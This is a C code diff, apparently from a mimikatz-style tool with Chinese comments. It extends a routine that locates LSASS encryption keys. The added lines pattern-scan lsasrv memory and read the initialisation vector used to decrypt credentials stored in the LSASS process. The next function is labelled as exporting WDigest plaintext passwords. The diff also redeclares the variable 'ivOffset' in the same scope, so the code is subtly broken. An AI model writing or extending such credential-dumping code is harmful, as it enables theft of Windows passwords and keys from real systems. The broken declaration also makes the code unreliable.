@@ -200,25 +200,36 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
 
 
-
 	/// 从lsass进程的内存中读取出IV(InitializationVector): g_sekurlsa_IV
 	DWORD ivOffset = 0;
 	BYTE InitializationVector[16];
 
-
-	// .text:0000000180056A10 78 4D                                   js      short loc_180056A5F
-	// .text:0000000180056A12 44 8D 4E F2                             lea     r9d, [rsi - 0Eh]; dwFlags
-	// .text:0000000180056A16 44 8B C6                                mov     r8d, esi; cbBuffer
-	// .text:0000000180056A19 48 8D 15 80 0C 13 00                    lea     rdx, ? InitializationVector@@3PAEA; pbBuffer
-	// .text:0000000180056A20 33 C9 xor ecx, ecx; hAlgorithm
+	// .text:0000000180056A10 78 4D                   js      short loc_180056A5F
+	// .text:0000000180056A12 44 8D 4E F2             lea     r9d, [rsi - 0Eh]; dwFlags
+	// .text:0000000180056A16 44 8B C6                mov     r8d, esi; cbBuffer
+	// .text:0000000180056A19 48 8D 15 80 0C 13 00    lea     rdx, ? InitializationVector@@3PAEA; pbBuffer
+	// .text:0000000180056A20 33 C9					  xor ecx, ecx; hAlgorithm
 
 	UCHAR keyIVSig[] = { 0x78, 0x4D,
 						0x44, 0x8D, 0x4E, 0xF2,
 						0x44, 0x8B, 0xC6,
 						0x48, 0x8D, 0x15 };
 
+	// 搜索IV特征码
+	DWORD ivSigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
+	if (ivSigOffset == 0) return;
 
+	// 读取4字节偏移
+	DWORD ivOffset = 0;
+	ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
 
+	// 计算IV全局变量地址
+	PUCHAR ivAddress = lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset;
+
+	// 直接读取16字节IV数据
+	ReadFromLsass(ivAddress, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
+	wprintf(L"IV Located: ");
+	HexdumpBytesPacked(g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
 }
 
 /// 导出Wdigest缓存在内存中的明文密码
